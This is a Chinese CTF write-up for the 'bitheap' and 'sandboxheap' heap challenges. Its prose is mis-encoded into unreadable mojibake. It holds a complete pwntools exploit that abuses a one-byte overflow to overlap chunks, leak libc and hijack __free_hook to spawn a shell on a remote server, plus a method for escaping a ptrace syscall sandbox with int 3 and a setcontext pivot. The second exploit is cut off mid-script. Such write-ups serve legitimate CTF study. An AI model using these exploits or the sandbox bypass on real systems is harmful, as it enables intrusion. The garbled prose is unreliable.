    <url>/2022/11/02/%E7%A5%A5%E4%BA%91%E6%9D%AF-sandboxheap%E5%92%8Cbitheap/</url>
    
    <content type="html"><![CDATA[<p>æˆ‘æ˜¯å…ˆå†™çš„sandboxheapï¼Œå¼€å§‹è¿˜ä»¥ä¸ºsandboxæ–‡ä»¶æ˜¯å¤šä½™çš„ï¼Œå°±ç›´æ¥å•ç‹¬æ‹¿sandboxheapå»å†™ï¼Œå°±åœ¨æœ¬åœ°æ‰“é€šåï¼Œå‘ç°è¿œç¨‹æ˜¯æœ‰é€šè¿‡sandboxå»æ‰§è¡Œsandboxheapï¼Œå½“æ—¶æˆ‘å°±æ²¡èƒ½å†™å‡ºæ¥ã€‚</p><p>å±±é‡æ°´å¤ç–‘æ— è·¯ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘ï¼æ²¡æƒ³åˆ°bitheapæ¼æ´å’Œsandboxheapä¸€æ¨¡ä¸€æ ·ï¼Œè€Œä¸”æ²¡æœ‰sandboxï¼Œå½“æ—¶å°±åªå†™å‡ºäº†bitheapã€‚</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¿™ä¸¤é“é¢˜éƒ½æ˜¯ä¸€æ ·çš„æ¼æ´ï¼Œä¸»è¦æ˜¯çœ‹æ‡‚ç¼–è¾‘å‡½æ•°ä¸­çš„æº¢å‡ºå’ŒåŠ å¯†ï¼š</p><p>å¦‚ä¸‹å›¾å°†å †å—å†™å…¥æ•°æ®çš„å¤§å°ä¹˜8 ï¼Œç„¶ååŠ 1ï¼›æœ€åæ˜¯é€šè¿‡åŸºäºè¾“å…¥çš„8ä¸ªå­—ç¬¦å»å¯¹å †ä¸­çš„ä¸€ä¸ªå­—èŠ‚è¿›è¡Œä½è¿ç®—ï¼Œæ¯ä¸ªå­—ç¬¦å¯ä»¥æ“ä½œå †ä¸­ä¸€ä¸ªå­—èŠ‚çš„ä¸€ä½ï¼›æœ€åä¼šå¤šå‡ºä¸€ä¸ªå­—èŠ‚å½±å“ä¸‹ä¸€ä¸ªå †å—çš„size</p><p><img src="/img/4/Screenshot_20221105_024929.png"></p><p>å¦‚ä¸‹å›¾sub_C61å‡½æ•°ï¼ŒåŸºäºå †å—ä¸­çš„å­—ç¬¦æ¥ä½è¿ç®—ï¼Œä½†å †å—åˆå§‹å€¼éƒ½æ˜¯<code>0</code>ï¼Œæœ€åè¢«å†™å…¥å †å—çš„ä¹Ÿæ˜¯0  ï¼›å¦‚æœè¾“å…¥çš„æ˜¯<code>\x31</code>å­—ç¬¦ä¼šè®©æœ€åè¢«å†™å…¥å †å—çš„çš„æ˜¯1ã€‚</p><p><img src="/img/4/Screenshot_20221105_025735.png"></p><h3 id="å †åˆ©ç”¨"><a href="#å †åˆ©ç”¨" class="headerlink" title="å †åˆ©ç”¨"></a>å †åˆ©ç”¨</h3><p>kaliå¯¹è¿™é“é¢˜ä½¿ç”¨patchelfä¼šæŠ¥é”™ï¼Œè¿™é‡Œæˆ‘æ˜¯ç”¨ubuntuå®Œæˆçš„</p><p>ç”±äºæº¢å‡ºçš„å­—èŠ‚åªèƒ½æ›´æ”¹ä¸‹ä¸€ä¸ªå †å—çš„sizeçš„æ ‡å¿—ä½ï¼ˆåˆ¤æ–­å †å—æ˜¯å¦è¢«ä½¿ç”¨ï¼‰ï¼Œéœ€è¦å¯¹ä¸‹ä¸€ä¸ªå †å—çš„prev_sizeå’Œæ ‡å¿—ä½ä¿®æ”¹ï¼Œè®©å…¶é‡Šæ”¾åè¿›å…¥unsortedbinï¼Œç„¶åä¸ä¸Šè¾¹çš„unsortedbinåˆå¹¶ã€‚</p><img src="/img/4/Screenshot_20221107_060716.png" style="zoom:80%;" /><p>å…·ä½“å†™å…¥</p><img src="/img/4/Screenshot_20221107_060903.png" style="zoom:80%;" /><h3 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h3><p>åˆ©ç”¨å †å—é‡å ç›´æ¥å»ä¿®æ”¹__free_hookä¸ºsystemå‡½æ•°å³å¯ã€‚</p><p>å®Œæ•´çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;bitheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process([&#x27;./sandbox&#x27;,&#x27;./sandboxheap&#x27;])</span><br><span class="hljs-comment">#p = process(&#x27;./bitheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;39.106.13.71&#x27;</span>,<span class="hljs-number">42991</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">pay</span>):<br>    pay = u64(pay)<br>    result = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        a = pay &amp; <span class="hljs-number">0xff</span><br>        <span class="hljs-comment">#print(hex(a))</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            b = <span class="hljs-number">1</span> &lt;&lt; i<br>            <span class="hljs-keyword">if</span> b &amp; a == <span class="hljs-number">0</span>:<br>                result += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>            <span class="hljs-keyword">else</span> :<br>                result += <span class="hljs-string">b&#x27;\x31&#x27;</span><br>        pay = pay &gt;&gt; <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0xb0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<br>    delete(i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    add(i, <span class="hljs-number">0x90</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>    delete(i)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>)<br><br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x80</span> + key(p64(<span class="hljs-number">0xc0</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>, payload)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br><br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = key(p64(free_hook))<br>edit(<span class="hljs-number">2</span>, payload)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">1</span>, key(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">3</span>, key(p64(sys_addr)))<br>delete(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h3><p>ä»¥å‰éƒ½æ˜¯å†™è°ƒç”¨prctlå‡½æ•°ï¼Œç¦æ­¢ç³»ç»Ÿè°ƒç”¨å¼€å¯çš„æ²™ç›’é¢˜ï¼Œä½†è¿™é¢˜ç›®ç›´æ¥ä½¿ç”¨æ²™ç›’ç¨‹åºæ¥ä¿æŠ¤å…¶å®ƒç¨‹åºã€‚</p><p>åˆ©ç”¨å †å—é‡å ä¿®æ”¹__free_hookåˆ°setcontextæ®µä¸Šï¼Œé‡Šæ”¾å †å—ä¼šæ‰§è¡Œsetcontextæ®µä¸Šçš„ä»£ç ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­rdiå°±æ˜¯è¢«é‡Šæ”¾å †å—å †å—çš„åœ°å€ï¼Œè¿›è€ŒåŠ«æŒrspã€‚</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; disassemble setcontext<br>   <span class="hljs-number">0x00007f5b32c80085</span> &lt;+<span class="hljs-number">53</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa0</span>]<br>   <span class="hljs-number">0x00007f5b32c8008c</span> &lt;+<span class="hljs-number">60</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x00007f5b32c80093</span> &lt;+<span class="hljs-number">67</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x78</span>]<br>   <span class="hljs-number">0x00007f5b32c80097</span> &lt;+<span class="hljs-number">71</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r12</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x48</span>]<br>   <span class="hljs-number">0x00007f5b32c8009b</span> &lt;+<span class="hljs-number">75</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r13</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x50</span>]<br>   <span class="hljs-number">0x00007f5b32c8009f</span> &lt;+<span class="hljs-number">79</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r14</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x58</span>]<br>   <span class="hljs-number">0x00007f5b32c800a3</span> &lt;+<span class="hljs-number">83</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r15</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x60</span>]<br>   <span class="hljs-number">0x00007f5b32c800a7</span> &lt;+<span class="hljs-number">87</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0xa8</span>]<br>   <span class="hljs-number">0x00007f5b32c800ae</span> &lt;+<span class="hljs-number">94</span>&gt;:<span class="hljs-keyword">push</span>   <span class="hljs-built_in">rcx</span><br>   <span class="hljs-number">0x00007f5b32c800af</span> &lt;+<span class="hljs-number">95</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x70</span>]<br>   <span class="hljs-number">0x00007f5b32c800b3</span> &lt;+<span class="hljs-number">99</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x88</span>]<br>   <span class="hljs-number">0x00007f5b32c800ba</span> &lt;+<span class="hljs-number">106</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rcx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x98</span>]<br>   <span class="hljs-number">0x00007f5b32c800c1</span> &lt;+<span class="hljs-number">113</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r8</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x28</span>]<br>   <span class="hljs-number">0x00007f5b32c800c5</span> &lt;+<span class="hljs-number">117</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">r9</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x30</span>]<br>   <span class="hljs-number">0x00007f5b32c800c9</span> &lt;+<span class="hljs-number">121</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">0x68</span>]<br>   <span class="hljs-number">0x00007f5b32c800cd</span> &lt;+<span class="hljs-number">125</span>&gt;:<span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x00007f5b32c800cf</span> &lt;+<span class="hljs-number">127</span>&gt;:<span class="hljs-keyword">ret</span>    <br></code></pre></td></tr></table></figure><p>æœ€åˆå¤ç°æ—¶æˆ‘æƒ³åœ¨å †ä¸Šæ‰§è¡ŒROPå°†flagé€šè¿‡orwè¯»å‡ºæ¥ï¼Œä½†æ˜¯æ²™ç›’ç¨‹åºå¥½åƒä¹Ÿç¦ç”¨openä¹‹ç±»çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæœ€åçœ‹ç½‘ä¸Šåˆ«çš„å¸ˆå‚…å†™çš„<a href="https://mp.weixin.qq.com/s/LtC68IafiEA6rAF-cAxb0Q">wp</a>æ‰çŸ¥é“éœ€è¦é€šè¿‡<code>int 3</code>è¿™ä¸ªè½¯ä¸­æ–­å»ç»•è¿‡ã€‚</p><h4 id="å…³äºint-3çš„ç»•è¿‡"><a href="#å…³äºint-3çš„ç»•è¿‡" class="headerlink" title="å…³äºint 3çš„ç»•è¿‡"></a>å…³äºint 3çš„ç»•è¿‡</h4><p>å…³äºint 3çš„ç»•è¿‡æˆ‘æ˜¯çœ‹ctftimeä¸Šå…³äºSandyboxçš„wpï¼Œç”±äºæˆ‘è‹±è¯­ä¸å¤ªå¥½åªèƒ½ç†è§£åˆ°è¿™é‡Œäº†ã€‚</p><p>sandboxç¨‹åºforkä¸€ä¸ªå­è¿›ç¨‹ï¼Œé€šè¿‡<strong>ptrace</strong>å‡½æ•°è·Ÿè¸ªå­è¿›ç¨‹ã€‚</p><p>è°ƒç”¨ptrace(PTRACE_SYS, pid, 0, signal)ä½¿å†…æ ¸åœ¨å­è¿›ç¨‹è¿›å…¥å’Œé€€å‡ºç³»ç»Ÿè°ƒç”¨æ—¶éƒ½å°†å…¶æš‚åœã€‚</p><p>sandboxç¨‹åºidaä¸­ä¸»è¦çš„ä¼ªä»£ç ï¼ˆç®€åŒ–ï¼‰ï¼š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">do&#123;<br><span class="hljs-built_in">if </span>( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) == -1<br>|| waitpid(v4, 0LL, 0) == -1<br>|| ptrace(PTRACE_GETREGS, v4, 0LL, v8) == -1 )<br>    &#123;<br>       break;<br>    &#125;<br>    <br>    <br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    //è¿‡æ»¤ä¸€äº›ç³»ç»Ÿè°ƒç”¨<br>   â€¦â€¦â€¦â€¦â€¦â€¦<br>   <br>   <br>&#125;while ( ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL) != -1<br>         &amp;&amp; waitpid(v4, 0LL, 0) != -1<br>         &amp;&amp; (v10 != 10000 &amp;&amp; v10 != -1 || ptrace(PTRACE_POKEUSER, v4, 80<span class="hljs-class">LL) != -1) );</span><br></code></pre></td></tr></table></figure><ol><li>å¾ªç¯å¼€å¤´å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>ä¸­é—´çš„ä»£ç å°±æ˜¯è·å–å½“å‰çš„ç³»ç»Ÿè°ƒç”¨å·ï¼ˆraxï¼‰ï¼Œè¿‡æ»¤ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>å¾ªç¯ç»“å°¾å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹ç¦»å¼€ç³»ç»Ÿè°ƒç”¨ã€‚</li></ol><p>ä½¿ç”¨<code>int 3</code>è¿™ä¸ªè½¯ä¸­æ–­åï¼Œå¯ä»¥è®©çˆ¶è¿›ç¨‹å¾ªç¯å¼€å¤´å¤„çš„ ptraceè¯¯ä»¥ä¸ºå­è¿›ç¨‹å·²ç»è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œä½†å®é™…ä¸Šå­è¿›ç¨‹å¹¶æœªè¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼›å½“å­è¿›ç¨‹çœŸæ­£è¿›å…¥ç³»ç»Ÿè°ƒç”¨åï¼Œæ˜¯è§¦å‘å¾ªç¯ç»“å°¾å¤„çš„ ptraceï¼Œ äº‹å®ä¸Šptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)å¹¶ä¸èƒ½åˆ¤æ–­å­è¿›ç¨‹æ˜¯è¿›å…¥ç³»ç»Ÿè°ƒç”¨è¿˜æ˜¯ç¦»å¼€ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ ·å°±ç»•è¿‡äº†ä¸­é—´å¯¹ç³»ç»Ÿè°ƒç”¨çš„è¿‡æ»¤ã€‚</p><p>ä½¿ç”¨int 3åï¼š</p><ol><li>å¾ªç¯ç»“å°¾å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹è¿›å…¥ç³»ç»Ÿè°ƒç”¨ï¼›</li><li>å¾ªç¯å¼€å¤´å¤„çš„ ptrace(PTRACE_SYSCALL, v4, 0LL, 0LL)ã€waitpid(v4, 0LL, 0)æ˜¯ç­‰å¾…å­è¿›ç¨‹ç¦»å¼€ç³»ç»Ÿè°ƒç”¨ã€‚</li></ol><p>ç›¸å½“äºåè½¬äº†å¾ªç¯ï¼Œä¹‹åå°±å¯ä»¥é¡ºåˆ©æ‰§è¡Œæ¥ä¸‹æ¥çš„shellcodeäº†ã€‚</p><p>å®Œæ•´çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sandboxheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.27.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>p = process([<span class="hljs-string">&#x27;./sandbox&#x27;</span>,<span class="hljs-string">&#x27;./sandboxheap&#x27;</span>])<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    